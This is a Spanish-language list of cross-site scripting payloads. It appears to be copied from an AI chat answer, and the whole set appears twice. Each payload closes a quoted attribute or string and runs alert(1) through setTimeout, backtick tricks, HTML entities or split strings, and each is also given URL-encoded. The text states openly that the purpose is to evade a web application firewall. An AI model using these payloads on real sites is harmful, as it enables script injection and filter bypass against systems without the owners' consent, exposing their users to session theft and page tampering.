

### Payloads para Cerrar las Comillas y Ejecutar `alert`

#### 1. **Cerrar las Comillas con `"` y Escapar con `\`**

html

Copiar código

`"\x60-setTimeout\x60alert\x601\x60\x60-\x60"`

Codificado en URL:

html

Copiar código

`%22%60-setTimeout%60alert%601%60%60-%60`

#### 2. **Cerrar las Comillas con `'` y Usar `\` para Escapar**

html

Copiar código

`'"\x60-setTimeout\x60alert\x601\x60\x60-\x60'`

Codificado en URL:

html

Copiar código

`%27%22%60-setTimeout%60alert%601%60%60-%60%27`

#### 3. **Usar `&#34;` para Cerrar las Comillas y Ejecutar `alert`**

html

Copiar código

``` &#34;`-setTimeout`alert`1``-` ```

Codificado en URL:

html

Copiar código

`%26%2334%3B%60-setTimeout%60alert%601%60%60-%60`

### Estrategia con Fragmentación

Para evadir mejor el WAF, podemos usar la fragmentación de cadenas:

#### 4. **Fragmentación de Cadenas**

html

Copiar código

`` `-window['set'+'Timeout']('alert(1)', 0)-` ``

Codificado en URL:

html

Copiar código

`%60-window%5B%27set%27%2B%27Timeout%27%5D%28%27alert%281%29%27,%200%29-%60`

Y cerrar las comillas del valor:

html

Copiar código

``"'`-window['set'+'Timeout']('alert(1)', 0)-'"``

Codificado en URL:

html

Copiar código

`%27%22%60-window%5B%27set%27%2B%27Timeout%27%5D%28%27alert%281%29%27,%200%29-%60%27`

### Payloads para Cerrar las Comillas y Ejecutar `alert`

#### 1. **Cerrar las Comillas con `"` y Escapar con `\`**

html

Copiar código

`"\x60-setTimeout\x60alert\x601\x60\x60-\x60"`

Codificado en URL:

html

Copiar código

`%22%60-setTimeout%60alert%601%60%60-%60`

#### 2. **Cerrar las Comillas con `'` y Usar `\` para Escapar**

html

Copiar código

`'"\x60-setTimeout\x60alert\x601\x60\x60-\x60'`

Codificado en URL:

html

Copiar código

`%27%22%60-setTimeout%60alert%601%60%60-%60%27`

#### 3. **Usar `&#34;` para Cerrar las Comillas y Ejecutar `alert`**

html

Copiar código

``` &#34;`-setTimeout`alert`1``-` ```

Codificado en URL:

html

Copiar código

`%26%2334%3B%60-setTimeout%60alert%601%60%60-%60`

### Estrategia con Fragmentación

Para evadir mejor el WAF, podemos usar la fragmentación de cadenas:

#### 4. **Fragmentación de Cadenas**

html

Copiar código

`` `-window['set'+'Timeout']('alert(1)', 0)-` ``

Codificado en URL:

html

Copiar código

`%60-window%5B%27set%27%2B%27Timeout%27%5D%28%27alert%281%29%27,%200%29-%60`

Y cerrar las comillas del valor:

html

Copiar código

``"'`-window['set'+'Timeout']('alert(1)', 0)-'"``

Codificado en URL:

html

Copiar código

`%27%22%60-window%5B%27set%27%2B%27Timeout%27%5D%28%27alert%281%29%27,%200%29-%60%27`




